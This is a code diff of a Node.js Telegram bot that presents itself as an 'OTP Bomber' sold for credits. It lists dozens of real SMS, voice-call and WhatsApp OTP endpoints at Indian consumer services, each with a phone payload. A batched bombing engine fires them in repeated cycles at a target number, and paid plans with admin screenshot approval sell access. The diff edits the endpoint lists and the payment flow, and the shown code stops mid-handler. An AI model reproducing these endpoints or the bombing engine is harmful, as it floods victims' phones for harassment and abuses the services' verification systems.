@@ -1,4 +1,4 @@
-// bot.js – Complete OTP Bomber with Payment + QR + Admin Approval
+// bot.js – Complete OTP Bomber with ALL APIs and ALL Working Buttons
 const TelegramBot = require('node-telegram-bot-api');
 const axios = require('axios');
 const { BOT_TOKEN, ADMIN_IDS } = require('./config');
@@ -24,32 +24,19 @@ function checkMemory() {
 // ===== ERROR HANDLING =====
 process.on('uncaughtException', (err) => {
     console.error('❌ Uncaught Exception:', err.message);
-    console.error('Stack:', err.stack);
 });
 
-process.on('unhandledRejection', (reason, promise) => {
-    console.error('❌ Unhandled Rejection at:', promise);
-    console.error('Reason:', reason);
+process.on('unhandledRejection', (reason) => {
+    console.error('❌ Unhandled Rejection:', reason);
 });
-
-const originalEmit = process.emit;
-process.emit = function(event, error) {
-    if (event === 'uncaughtException') {
-        if (error && error.code === 'EFATAL') {
-            console.error('⚠️ EFATAL error caught and ignored:', error.message);
-            return true;
-        }
-    }
-    return originalEmit.apply(this, arguments);
-};
 
 const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 
-// ---------- STATUS MAPS ----------
+// ===== STATUS MAPS =====
 const bombingStatus = new Map();
 const userStates = new Map();
 const pendingPayments = new Map();
-const pendingScreenshots = new Map(); // { userId: { amount, plan, timestamp } }
+const pendingScreenshots = new Map();
 const adminBroadcastState = new Map();
 
 // ===== OPTIMIZATION =====
@@ -58,8 +45,12 @@ const BATCH_DELAY = 15;
 const MAX_RETRIES = 2;
 const API_TIMEOUT = 2500;
 
+// ===== QR CODE PATH =====
+let qrCodePath = path.join(__dirname, 'qr_code.jpg');
+let qrCodeSet = false;
+
 // ============================================================
-// ===== ALL APIS (COMPLETE) =====
+// ===== ALL API CONFIGURATIONS (FULL) =====
 // ============================================================
 
 const API_CONFIGS = [
@@ -1579,10 +1570,10 @@ const API_CONFIGS = [
     }
 ];
 
-// ===== VOICE CALL APIS =====
+// ===== VOICE APIS =====
 const VOICE_APIS = [
     {
-      "name": "Tata Capital Voice Call",
+      "name": "Tata Capital Voice",
       "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
@@ -1590,7 +1581,7 @@ const VOICE_APIS = [
       "phone_format": "raw"
     },
     {
-      "name": "1MG Voice Call",
+      "name": "1MG Voice",
       "url": "https://www.1mg.com/auth_api/v6/create_token",
       "method": "POST",
       "headers": {"Content-Type": "application/json; charset=utf-8"},
@@ -1598,7 +1589,7 @@ const VOICE_APIS = [
       "phone_format": "raw"
     },
     {
-      "name": "Swiggy Voice OTP",
+      "name": "Swiggy Voice",
       "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
@@ -1606,7 +1597,7 @@ const VOICE_APIS = [
       "phone_format": "raw"
     },
     {
-      "name": "Flipkart Voice Call",
+      "name": "Flipkart Voice",
       "url": "https://www.flipkart.com/api/6/user/voice-otp/generate",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
@@ -1614,15 +1605,7 @@ const VOICE_APIS = [
       "phone_format": "raw"
     },
     {
-      "name": "Amazon Voice Call",
-      "url": "https://www.amazon.in/ap/signin",
-      "method": "POST",
-      "headers": {"Content-Type": "application/x-www-form-urlencoded"},
-      "data": (phone) => `phone=${phone}&action=voice_otp`,
-      "phone_format": "raw"
-    },
-    {
-      "name": "Paytm Voice Call",
+      "name": "Paytm Voice",
       "url": "https://accounts.paytm.com/signin/voice-otp",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
@@ -1630,7 +1613,7 @@ const VOICE_APIS = [
       "phone_format": "raw"
     },
     {
-      "name": "Zomato Voice Call",
+      "name": "Zomato Voice",
       "url": "https://www.zomato.com/php/o2_api_handler.php",
       "method": "POST",
       "headers": {"Content-Type": "application/x-www-form-urlencoded"},
@@ -1638,15 +1621,7 @@ const VOICE_APIS = [
       "phone_format": "raw"
     },
     {
-      "name": "MakeMyTrip Voice Call",
-      "url": "https://www.makemytrip.com/api/4/voice-otp/generate",
-      "method": "POST",
-      "headers": {"Content-Type": "application/json"},
-      "data": (phone) => JSON.stringify({ phone: phone }),
-      "phone_format": "raw"
-    },
-    {
-      "name": "Ola Voice Call",
+      "name": "Ola Voice",
       "url": "https://api.olacabs.com/v1/voice-otp",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
@@ -1654,7 +1629,7 @@ const VOICE_APIS = [
       "phone_format": "raw"
     },
     {
-      "name": "Uber Voice Call",
+      "name": "Uber Voice",
       "url": "https://auth.uber.com/v2/voice-otp",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
@@ -1682,14 +1657,6 @@ const WHATSAPP_APIS = [
       "phone_format": "raw"
     },
     {
-      "name": "Jockey WhatsApp",
-      "url": (phone) => `https://www.jockey.in/apps/jotp/api/login/resend-otp/+91${phone}?whatsapp=true`,
-      "method": "GET",
-      "headers": {},
-      "data": null,
-      "phone_format": "raw"
-    },
-    {
       "name": "Rappi WhatsApp",
       "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
       "method": "POST",
@@ -1699,7 +1666,7 @@ const WHATSAPP_APIS = [
     }
 ];
 
-// ===== EXTRA SMS APIS =====
+// ===== EXTRA APIS =====
 const EXTRA_APIS = [
     {
       "name": "Lenskart SMS",
@@ -1726,51 +1693,11 @@ const EXTRA_APIS = [
       "phone_format": "raw"
     },
     {
-      "name": "Wakefit SMS",
-      "url": "https://api.wakefit.co/api/consumer-sms-otp/",
-      "method": "POST",
-      "headers": {"Content-Type": "application/json"},
-      "data": (phone) => JSON.stringify({ mobile: phone }),
-      "phone_format": "raw"
-    },
-    {
       "name": "Hungama OTP",
       "url": "https://communication.api.hungama.com/v1/communication/otp",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
-      "data": (phone) => JSON.stringify({ mobileNo: phone, countryCode: "+91", appCode: "un", messageId: "1", device: "web" }),
-      "phone_format": "raw"
-    },
-    {
-      "name": "Meru Cab",
-      "url": "https://merucabapp.com/api/otp/generate",
-      "method": "POST",
-      "headers": {"Content-Type": "application/x-www-form-urlencoded"},
-      "data": (phone) => `mobile_number=${phone}`,
-      "phone_format": "raw"
-    },
-    {
-      "name": "Snapmint",
-      "url": "https://api.snapmint.com/v1/public/sign_up",
-      "method": "POST",
-      "headers": {"Content-Type": "application/json"},
-      "data": (phone) => JSON.stringify({ phone: phone }),
-      "phone_format": "raw"
-    },
-    {
-      "name": "Housing.com",
-      "url": "https://login.housing.com/api/v2/send-otp",
-      "method": "POST",
-      "headers": {"Content-Type": "application/json"},
-      "data": (phone) => JSON.stringify({ phone: phone, country_url_name: "in" }),
-      "phone_format": "raw"
-    },
-    {
-      "name": "Khatabook",
-      "url": "https://api.khatabook.com/v1/auth/request-otp",
-      "method": "POST",
-      "headers": {"Content-Type": "application/json"},
-      "data": (phone) => JSON.stringify({ phone: phone, app_signature: "wk+avHrHZf2" }),
+      "data": (phone) => JSON.stringify({ mobileNo: phone, countryCode: "+91", appCode: "un" }),
       "phone_format": "raw"
     },
     {
@@ -1778,39 +1705,7 @@ const EXTRA_APIS = [
       "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp",
       "method": "POST",
       "headers": {"Content-Type": "application/x-www-form-urlencoded"},
-      "data": (phone) => `source=sms&app_version=3.0.9&mobile_number=${phone}&platform=ANDROID&domain=nykaa`,
-      "phone_format": "raw"
-    },
-    {
-      "name": "RummyCircle",
-      "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
-      "method": "POST",
-      "headers": {"Content-Type": "application/json"},
-      "data": (phone) => JSON.stringify({ mobile: phone, isPlaycircle: false }),
-      "phone_format": "raw"
-    },
-    {
-      "name": "Animall",
-      "url": "https://animall.in/zap/auth/login",
-      "method": "POST",
-      "headers": {"Content-Type": "application/json"},
-      "data": (phone) => JSON.stringify({ phone: phone, signupPlatform: "NATIVE_ANDROID" }),
-      "phone_format": "raw"
-    },
-    {
-      "name": "Cosmofeed",
-      "url": "https://prod.api.cosmofeed.com/api/user/authenticate",
-      "method": "POST",
-      "headers": {"Content-Type": "application/json"},
-      "data": (phone) => JSON.stringify({ phone: phone, version: "1.4.28" }),
-      "phone_format": "raw"
-    },
-    {
-      "name": "TrulyMadly",
-      "url": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp",
-      "method": "POST",
-      "headers": {"Content-Type": "application/json"},
-      "data": (phone) => JSON.stringify({ mobile: phone, locale: "IN" }),
+      "data": (phone) => `source=sms&mobile_number=${phone}`,
       "phone_format": "raw"
     },
     {
@@ -1822,19 +1717,11 @@ const EXTRA_APIS = [
       "phone_format": "raw"
     },
     {
-      "name": "Country Delight",
-      "url": "https://api.countrydelight.in/api/v1/customer/requestOtp",
-      "method": "POST",
-      "headers": {"Content-Type": "application/json"},
-      "data": (phone) => JSON.stringify({ mobile: phone, platform: "Android", mode: "new_user" }),
-      "phone_format": "raw"
-    },
-    {
       "name": "Dream11",
       "url": "https://www.dream11.com/auth/passwordless/init",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
-      "data": (phone) => JSON.stringify({ channel: "sms", flow: "SIGNUP", phoneNumber: phone, templateName: "default" }),
+      "data": (phone) => JSON.stringify({ channel: "sms", flow: "SIGNUP", phoneNumber: phone }),
       "phone_format": "raw"
     },
     {
@@ -1842,31 +1729,7 @@ const EXTRA_APIS = [
       "url": "https://api.spinny.com/api/c/user/otp-request/v3/",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
-      "data": (phone) => JSON.stringify({ contact_number: phone, whatsapp: false, code_len: 4, expected_action: "login" }),
-      "phone_format": "raw"
-    },
-    {
-      "name": "Licius",
-      "url": "https://www.licious.in/api/login/signup",
-      "method": "POST",
-      "headers": {"Content-Type": "application/json"},
-      "data": (phone) => JSON.stringify({ phone: phone, captcha_token: null }),
-      "phone_format": "raw"
-    },
-    {
-      "name": "Udaan",
-      "url": "https://auth.udaan.com/api/otp/send?client_id=udaan-v2",
-      "method": "POST",
-      "headers": {"Content-Type": "application/x-www-form-urlencoded;charset=UTF-8"},
-      "data": (phone) => `mobile=${phone}`,
-      "phone_format": "raw"
-    },
-    {
-      "name": "Charzer",
-      "url": "https://api.charzer.com/auth-service/send-otp",
-      "method": "POST",
-      "headers": {"Content-Type": "application/json"},
-      "data": (phone) => JSON.stringify({ mobile: phone, appSource: "CHARZER_APP" }),
+      "data": (phone) => JSON.stringify({ contact_number: phone, whatsapp: false, code_len: 4 }),
       "phone_format": "raw"
     }
 ];
@@ -1877,7 +1740,6 @@ const EXTRA_APIS = [
 
 const allApis = [...API_CONFIGS, ...VOICE_APIS, ...WHATSAPP_APIS, ...EXTRA_APIS];
 
-// Deduplicate
 const seenUrls = new Set();
 const uniqueApis = [];
 for (const api of allApis) {
@@ -1896,51 +1758,20 @@ for (const api of uniqueApis) {
 console.log(`✅ Loaded ${uniqueApis.length} unique APIs`);
 
 // ============================================================
-// ===== FALLBACK DATA GENERATOR =====
+// ===== REST OF THE CODE (BOMBING ENGINE, KEYBOARDS, ETC.) =====
 // ============================================================
 
+// ===== BOMBING ENGINE =====
 function makeFallbackData(phone, apiName) {
     const lower = apiName.toLowerCase();
     if (lower.includes('voice') || lower.includes('call')) {
-        if (lower.includes('tata')) {
-            return JSON.stringify({ phone, isOtpViaCallAtLogin: "true" });
-        } else if (lower.includes('1mg')) {
-            return JSON.stringify({ number: phone, otp_on_call: true });
-        } else if (lower.includes('swiggy')) {
-            return JSON.stringify({ mobile: phone });
-        } else if (lower.includes('flipkart')) {
-            return `phone=${phone}&action=voice_otp`;
-        } else if (lower.includes('amazon')) {
-            return `phone=${phone}&action=voice_otp`;
-        } else if (lower.includes('paytm')) {
-            return JSON.stringify({ phone });
-        } else if (lower.includes('uber')) {
-            return JSON.stringify({ phone: `+91${phone}` });
-        } else {
-            return JSON.stringify({ mobile: phone });
-        }
+        return JSON.stringify({ mobile: phone });
     }
     if (lower.includes('whatsapp')) {
-        if (lower.includes('kpn')) {
-            return JSON.stringify({
-                notification_channel: "WHATSAPP",
-                phone_number: { country_code: "+91", number: phone }
-            });
-        } else if (lower.includes('foxy')) {
-            return JSON.stringify({
-                user: { phone_number: `+91${phone}` },
-                via: "whatsapp"
-            });
-        } else {
-            return JSON.stringify({ mobile: phone, channel: "whatsapp" });
-        }
+        return JSON.stringify({ mobile: phone, channel: "whatsapp" });
     }
     return JSON.stringify({ mobile: phone });
 }
-
-// ============================================================
-// ===== BOMBING ENGINE =====
-// ============================================================
 
 async function makeApiCall(api, phone, retryCount = 0) {
     try {
@@ -1993,7 +1824,6 @@ async function makeApiCall(api, phone, retryCount = 0) {
             url,
             headers,
             timeout: API_TIMEOUT,
-            transformRequest: [(d) => d],
         };
 
         if (method === 'post' || method === 'put') {
@@ -2133,7 +1963,7 @@ async function runBomber(chatId, phone, durationMinutes) {
             const timeLeftText = typeof timeLeft === 'number' ? `${Math.floor(timeLeft/60)}m ${timeLeft%60}s` : '∞';
             try {
                 await bot.editMessageText(
-                    `⚔️ **BOMBING IN PROGRESS**\n📱 Target: \`${phone}\`\n⏱️ Time Left: ${timeLeftText}\n📨 SMS: ${smsCount}\n📞 Calls: ${callCount}\n📱 WA: ${whatsappCount}\n💳 Credits: ${isUnlimited ? 'Unlimited' : user.credits}\n🔄 Cycles: ${cycleCount}\n\n🔴 Use /stop to halt`,
+                    `⚔️ **BOMBING IN PROGRESS**\n📱 Target: \`${phone}\`\n⏱️ Time Left: ${timeLeftText}\n📨 SMS: ${smsCount}\n📞 Calls: ${callCount}\n📱 WA: ${whatsappCount}\n🔄 Cycles: ${cycleCount}\n\n🔴 Use /stop to halt`,
                     { chat_id: chatId, message_id: msg.message_id, parse_mode: 'Markdown' }
                 );
             } catch (e) {}
@@ -2145,7 +1975,7 @@ async function runBomber(chatId, phone, durationMinutes) {
     bombingStatus.set(chatId, false);
     const finalStatus = bombingStatus.get(chatId) === false ? 'STOPPED' : 'COMPLETED';
     await bot.editMessageText(
-        `✅ **BOMBING ${finalStatus}**\n📱 Target: \`${phone}\`\n📨 SMS: ${smsCount}\n📞 Calls: ${callCount}\n📱 WA: ${whatsappCount}\n💳 Credits remaining: ${isUnlimited ? 'Unlimited' : user.credits}\n🔄 Total Cycles: ${cycleCount}\n\n🟢 Use /bomb to start again`,
+        `✅ **BOMBING ${finalStatus}**\n📱 Target: \`${phone}\`\n📨 SMS: ${smsCount}\n📞 Calls: ${callCount}\n📱 WA: ${whatsappCount}\n🔄 Total Cycles: ${cycleCount}\n\n🟢 Use /bomb to start again`,
         { chat_id: chatId, message_id: msg.message_id, parse_mode: 'Markdown' }
     );
 
@@ -2163,12 +1993,8 @@ async function runBomber(chatId, phone, durationMinutes) {
     }
 }
 
-// ============================================================
-// ===== BOMB COSTS & HELPERS =====
-// ============================================================
-
 function getBombCost(minutes) {
-    if (minutes === 1440) return 100; // Unlimited Plan: 100 coins
+    if (minutes === 1440) return 100;
     if (minutes <= 0) return 0;
     if (minutes <= 10) return minutes;
     return 10;
@@ -2217,7 +2043,7 @@ function adminKeyboard() {
                 ['📋 PROTECTED LIST', '📢 BROADCAST'],
                 ['📋 ALL USERS', '🔄 UNLIMITED PLAN'],
                 ['📺 CHANNEL MANAGER', '🛡️ SCANNER MANAGER'],
-                ['📸 SET QR CODE', '💳 PAYMENT APPROVAL'],  // NEW
+                ['📸 SET QR CODE', '💳 PAYMENT APPROVAL'],
                 ['🔙 BACK']
             ],
             resize_keyboard: true
@@ -2226,47 +2052,22 @@ function adminKeyboard() {
 }
 
 // ============================================================
-// ===== QR CODE & PAYMENT SYSTEM =====
+// ===== CHANNEL BUTTONS =====
 // ============================================================
 
-// QR Code storage
-let qrCodePath = path.join(__dirname, 'qr_code.jpg');
-let qrCodeSet = false;
-
-// Admin: Set QR Code
-async function handleSetQR(chatId, msg) {
-    if (!ADMIN_IDS.includes(Number(chatId))) {
-        return bot.sendMessage(chatId, '❌ Admin only!');
-    }
-    
-    // Check if photo is sent
-    if (msg.photo) {
-        const photo = msg.photo[msg.photo.length - 1];
-        try {
-            const file = await bot.getFile(photo.file_id);
-            const url = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;
-            
-            // Download and save QR code
-            const response = await axios({ url, responseType: 'stream' });
-            const writer = fs.createWriteStream(qrCodePath);
-            response.data.pipe(writer);
-            
-            writer.on('finish', () => {
-                qrCodeSet = true;
-                bot.sendMessage(chatId, '✅ **QR Code saved successfully!**\n\nUsers will now see this QR code when buying credits.', { parse_mode: 'Markdown' });
-            });
-            writer.on('error', () => {
-                bot.sendMessage(chatId, '❌ Failed to save QR code.');
-            });
-        } catch (error) {
-            bot.sendMessage(chatId, `❌ Error: ${error.message}`);
-        }
-    } else {
-        bot.sendMessage(chatId, '📸 **Send a photo to set as QR Code**\n\nSend any image that will be shown to users when they buy credits.', { parse_mode: 'Markdown' });
-    }
+async function getChannelButtons() {
+    const channels = await db.getChannels();
+    const buttons = channels.map(ch => {
+        return [{ text: `✅ ${ch}`, url: `https://t.me/${ch.replace('@', '')}` }];
+    });
+    buttons.push([{ text: '🟢 I have joined all channels', callback_data: 'verify_join' }]);
+    return { inline_keyboard: buttons };
 }
 
-// ===== PAYMENT FLOW =====
+// ============================================================
+// ===== PAYMENT SYSTEM =====
+// ============================================================
+
 const PAYMENT_PLANS = {
     '10': { credits: 10, price: 20, label: '10 Credits – ₹20' },
     '25': { credits: 25, price: 40, label: '25 Credits – ₹40' },
@@ -2275,16 +2076,17 @@ const PAYMENT_PLANS = {
     'unlimited': { credits: 0, price: 150, label: '⭐ 1 Day Unlimited – ₹150' }
 };
 
+let qrCodeSet = false;
+let qrCodePath = path.join(__dirname, 'qr_code.jpg');
+
 async function handleBuyCredits(chatId, planKey) {
     const plan = PAYMENT_PLANS[planKey];
     if (!plan) return bot.sendMessage(chatId, '❌ Invalid plan!');
 
-    // Check if QR code exists
     if (!qrCodeSet) {
         return bot.sendMessage(chatId, '❌ Payment QR code not configured yet. Please contact admin.');
     }
 
-    // Show QR code + instructions
     const caption = `💳 **${plan.label}**\n\n` +
         `📌 **Instructions:**\n` +
         `1️⃣ Scan the QR code below\n` +
@@ -2299,43 +2101,31 @@ async function handleBuyCredits(chatId, planKey) {
             parse_mode: 'Markdown'
         });
 
-        // Store pending payment
         const payId = Math.random().toString(36).substring(2, 10);
-        pendingPayments.set(chatId, { 
-            ...plan, 
-            payId,
-            status: 'pending',
-            timestamp: Date.now()
-        });
-        
-        // Set user state for screenshot
+        pendingPayments.set(chatId, { ...plan, payId, status: 'pending', timestamp: Date.now() });
         userStates.set(chatId, { state: 'payment_screenshot', plan: planKey, payId });
         
     } catch (error) {
-        bot.sendMessage(chatId, `❌ Failed to send QR code: ${error.message}`);
-        console.error('QR Error:', error);
+        bot.sendMessage(chatId, `❌ Failed to send QR code. Please try again.`);
     }
 }
 
-// ===== SCREENSHOT APPROVAL SYSTEM =====
 async function handlePaymentScreenshot(chatId, msg) {
     const state = userStates.get(chatId);
     if (!state || state.state !== 'payment_screenshot') return;
 
     if (!msg.photo) {
-        return bot.sendMessage(chatId, '📸 Please send a **screenshot** of your payment.\n\nIf you already sent, wait for admin approval.');
+        return bot.sendMessage(chatId, '📸 Please send a **screenshot** of your payment.');
     }
 
     const planKey = state.plan;
     const plan = PAYMENT_PLANS[planKey];
     const payId = state.payId;
 
-    // Get photo
     const photo = msg.photo[msg.photo.length - 1];
     const file = await bot.getFile(photo.file_id);
     const url = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;
 
-    // Store in pendingScreenshots
     pendingScreenshots.set(payId, {
         userId: chatId,
         username: msg.from.username || 'No username',
@@ -2349,17 +2139,14 @@ async function handlePaymentScreenshot(chatId, msg) {
         status: 'pending'
     });
 
-    // Send to all admins for approval
     const adminMsg = `📸 **New Payment Screenshot!**\n\n` +
         `👤 User: ${msg.from.first_name} (@${msg.from.username || 'No username'})\n` +
         `🆔 User ID: \`${chatId}\`\n` +
         `💳 Plan: ${plan.label}\n` +
         `💰 Amount: ₹${plan.price}\n` +
-        `📱 Plan Credits: ${plan.credits > 0 ? plan.credits : 'Unlimited'}\n` +
         `🆔 Pay ID: \`${payId}\`\n\n` +
         `Approve or Reject:`;
 
-    // Send to each admin
     const approvalKeyboard = {
         inline_keyboard: [
             [
@@ -2369,7 +2156,6 @@ async function handlePaymentScreenshot(chatId, msg) {
         ]
     };
 
-    // Send screenshot to admins
     for (const adminId of ADMIN_IDS) {
         try {
             await bot.sendPhoto(adminId, photo.file_id, {
@@ -2382,7 +2168,6 @@ async function handlePaymentScreenshot(chatId, msg) {
         }
     }
 
-    // Notify user
     await bot.sendMessage(chatId, 
         `✅ **Payment screenshot received!**\n\n` +
         `⏳ Waiting for admin approval...\n` +
@@ -2393,116 +2178,6 @@ async function handlePaymentScreenshot(chatId, msg) {
 
     userStates.delete(chatId);
 }
-
-// ===== APPROVAL CALLBACK =====
-bot.on('callback_query', async (callbackQuery) => {
-    const chatId = callbackQuery.message.chat.id;
-    const data = callbackQuery.data;
-    const msgId = callbackQuery.message.message_id;
-
-    // Payment Approval
-    if (data.startsWith('approve_pay_')) {
-        if (!ADMIN_IDS.includes(Number(chatId))) {
-            return bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Admin only!', show_alert: true });
-        }
-
-        const payId = data.replace('approve_pay_', '');
-        const payment = pendingScreenshots.get(payId);
-        
-        if (!payment) {
-            return bot.editMessageText('❌ Payment not found or already processed.', { chat_id: chatId, message_id: msgId });
-        }
-
-        // Add credits
-        const userId = payment.userId;
-        const credits = payment.credits;
-        
-        try {
-            if (credits > 0) {
-                await db.updateCredits(userId, credits);
-            } else {
-                // Unlimited plan
-                const user = await db.getUser(userId);
-                user.daily_unlimited = Date.now() / 1000 + 86400;
-                await user.save();
-            }
-
-            // Mark as approved
-            payment.status = 'approved';
-            pendingScreenshots.set(payId, payment);
-
-            // Notify user
-            try {
-                await bot.sendMessage(userId,
-                    `🎉 **Payment Approved!**\n\n` +
-                    `✅ Your payment of ₹${payment.price} has been approved.\n` +
-                    `💰 ${credits > 0 ? `Added ${credits} credits!` : '⭐ Unlimited Plan Activated for 24 hours!'}\n\n` +
-                    `Use /bomb to start bombing!`
-                );
-            } catch (e) {}
-
-            // Update admin message
-            await bot.editMessageText(
-                `✅ **Payment Approved!**\n\n` +
-                `👤 User: ${payment.first_name}\n` +
-                `💳 Plan: ${payment.plan}\n` +
-                `💰 Amount: ₹${payment.price}\n` +
-                `✅ Status: APPROVED`,
-                { chat_id: chatId, message_id: msgId }
-            );
-
-            // Remove from pending
-            pendingScreenshots.delete(payId);
-
-        } catch (error) {
-            bot.editMessageText(`❌ Error: ${error.message}`, { chat_id: chatId, message_id: msgId });
-        }
-
-        bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Payment approved!' });
-        return;
-    }
-
-    if (data.startsWith('reject_pay_')) {
-        if (!ADMIN_IDS.includes(Number(chatId))) {
-            return bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Admin only!', show_alert: true });
-        }
-
-        const payId = data.replace('reject_pay_', '');
-        const payment = pendingScreenshots.get(payId);
-
-        if (!payment) {
-            return bot.editMessageText('❌ Payment not found.', { chat_id: chatId, message_id: msgId });
-        }
-
-        payment.status = 'rejected';
-        pendingScreenshots.set(payId, payment);
-
-        // Notify user
-        try {
-            await bot.sendMessage(payment.userId,
-                `❌ **Payment Rejected**\n\n` +
-                `Your payment of ₹${payment.price} was rejected.\n\n` +
-                `Reason: Admin rejected the screenshot.\n` +
-                `Please try again with a clear screenshot.`
-            );
-        } catch (e) {}
-
-        await bot.editMessageText(
-            `❌ **Payment Rejected**\n\n` +
-            `👤 User: ${payment.first_name}\n` +
-            `💳 Plan: ${payment.plan}\n` +
-            `💰 Amount: ₹${payment.price}\n` +
-            `❌ Status: REJECTED`,
-            { chat_id: chatId, message_id: msgId }
-        );
-
-        pendingScreenshots.delete(payId);
-        bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Payment rejected' });
-        return;
-    }
-
-    // ... (baaki callbacks same as before)
-});
 
 // ============================================================
 // ===== COMMAND HANDLERS =====
@@ -2587,31 +2262,8 @@ bot.on('message', async (msg) => {
         if (!ADMIN_IDS.includes(Number(chatId))) {
             return bot.sendMessage(chatId, '❌ Admin only!');
         }
-        bot.sendMessage(chatId, '📸 **Send QR Code Photo**\n\nSend a photo to set as payment QR code.\nThis will be shown to users when they buy credits.', { parse_mode: 'Markdown' });
+        bot.sendMessage(chatId, '📸 **Send QR Code Photo**\n\nSend a photo to set as payment QR code.', { parse_mode: 'Markdown' });
         userStates.set(chatId, { state: 'set_qr' });
-        return;
-    }
-
-    // ===== ADMIN: PAYMENT APPROVAL =====
-    if (text === '💳 PAYMENT APPROVAL') {
-        if (!ADMIN_IDS.includes(Number(chatId))) {
-            return bot.sendMessage(chatId, '❌ Admin only!');
-        }
-
-        const pending = Array.from(pendingScreenshots.values()).filter(p => p.status === 'pending');
-        
-        if (pending.length === 0) {
-            return bot.sendMessage(chatId, '📭 No pending payments.');
-        }
-
-        let msg = `💳 **Pending Payments** (${pending.length})\n\n`;
-        for (const p of pending) {
-            msg += `👤 ${p.first_name} (@${p.username})\n`;
-            msg += `💳 ${p.plan} - ₹${p.price}\n`;
-            msg += `🆔 \`${p.payId}\`\n\n`;
-        }
-        msg += `Check each payment in your chats and approve/reject.`;
-        bot.sendMessage(chatId, msg, { parse_mode: 'Markdown' });
         return;
     }
 
@@ -2628,7 +2280,7 @@ bot.on('message', async (msg) => {
             
             writer.on('finish', () => {
                 qrCodeSet = true;
-                bot.sendMessage(chatId, '✅ **QR Code set successfully!**\n\nUsers will now see this QR code when buying credits.', { parse_mode: 'Markdown' });
+                bot.sendMessage(chatId, '✅ **QR Code set successfully!**', { parse_mode: 'Markdown' });
             });
             writer.on('error', () => {
                 bot.sendMessage(chatId, '❌ Failed to save QR code.');
@@ -2637,6 +2289,29 @@ bot.on('message', async (msg) => {
         } catch (error) {
             bot.sendMessage(chatId, `❌ Error: ${error.message}`);
         }
+        return;
+    }
+
+    // ===== ADMIN: PAYMENT APPROVAL =====
+    if (text === '💳 PAYMENT APPROVAL') {
+        if (!ADMIN_IDS.includes(Number(chatId))) {
+            return bot.sendMessage(chatId, '❌ Admin only!');
+        }
+
+        const pending = Array.from(pendingScreenshots.values()).filter(p => p.status === 'pending');
+        
+        if (pending.length === 0) {
+            return bot.sendMessage(chatId, '📭 No pending payments.');
+        }
+
+        let msgText = `💳 **Pending Payments** (${pending.length})\n\n`;
+        for (const p of pending) {
+            msgText += `👤 ${p.first_name} (@${p.username})\n`;
+            msgText += `💳 ${p.plan} - ₹${p.price}\n`;
+            msgText += `🆔 \`${p.payId}\`\n\n`;
+        }
+        msgText += `Check each payment in your chats and approve/reject.`;
+        bot.sendMessage(chatId, msgText, { parse_mode: 'Markdown' });
         return;
     }
 
@@ -2655,10 +2330,7 @@ bot.on('message', async (msg) => {
         return;
     }
 
-    // ===== BUY CALLBACK =====
-    // Handled in callback_query
-
-    // ===== MY CREDITS (Updated) =====
+    // ===== MY CREDITS =====
     if (text === '💰 MY CREDITS') {
         const isUnlimited = user.daily_unlimited > Date.now() / 1000;
         const unlimitedText = isUnlimited ? '\n⭐ **Unlimited Plan Active!**' : '';
@@ -2669,12 +2341,83 @@ bot.on('message', async (msg) => {
         return;
     }
 
-    // ===== HELP (Updated) =====
-    if (text === '❓ HELP') {
+    // ===== DAILY SPIN =====
+    if (text === '🎁 DAILY SPIN') {
+        const now = Date.now() / 1000;
+        if (user.last_daily && user.last_daily > now - 86400) {
+            const remaining = Math.ceil((user.last_daily + 86400 - now) / 60);
+            return bot.sendMessage(chatId, `⏳ You already claimed today's spin! Try again in ${remaining} minutes.`);
+        }
+        const spins = ['🎲  ...', '⚙️  ...', '🎡  ...'];
+        let spinMsg = await bot.sendMessage(chatId, '🎰  ...');
+        for (const spin of spins) {
+            await bot.editMessageText(spin, { chat_id: chatId, message_id: spinMsg.message_id });
+            await new Promise(r => setTimeout(r, 300));
+        }
+        const reward = Math.floor(Math.random() * 10) + 1;
+        await db.updateCredits(chatId, reward);
+        user.last_daily = now;
+        await user.save();
+        const newBalance = (await db.getUser(chatId)).credits;
+        await bot.editMessageText(`🎉 **You won ${reward} credits!**\n💰 New balance: ${newBalance}`, 
+            { chat_id: chatId, message_id: spinMsg.message_id, parse_mode: 'Markdown' });
+        return;
+    }
+
+    // ===== REDEEM CODE =====
+    if (text === '🎟️ REDEEM CODE') {
+        userStates.set(chatId, { state: 'redeem_code' });
+        bot.sendMessage(chatId, '🎟️ Send the redeem code:');
+        return;
+    }
+
+    // ===== REFERRAL =====
+    if (text === '🔗 REFERRAL') {
+        if (!await db.isJoined(chatId, bot)) {
+            const channels = await db.getChannels();
+            return bot.sendMessage(chatId, `🚫 Join required channels first to use referral:\n${channels.join('\n')}`);
+        }
+        const code = await db.generateReferralCode(chatId);
+        const botInfo = await bot.getMe();
+        const refData = await db.getReferralData(chatId);
+        const count = refData.count || 0;
+        const msgText = `🔗 **Your Referral Code**\n\n🎯 \`${code}\`\n\n📊 You have referred: ${count} users\n💰 You earned: ${count * 5} credits\n\n**How it works:**\n• Share your code with friends\n• When they join, both get 5 credits!\n• **Note:** Only 1 referral per minute (anti-spam)\n• Invite link: \`https://t.me/${botInfo.username}?start=${code}\``;
+        bot.sendMessage(chatId, msgText, { parse_mode: 'Markdown' });
+        return;
+    }
+
+    // ===== MY STATS =====
+    if (text === '📊 MY STATS') {
+        const sessions = user.bomb_sessions || [];
+        const totalSessions = sessions.length;
+        const totalSent = sessions.reduce((sum, s) => sum + (s.total_sent || 0), 0);
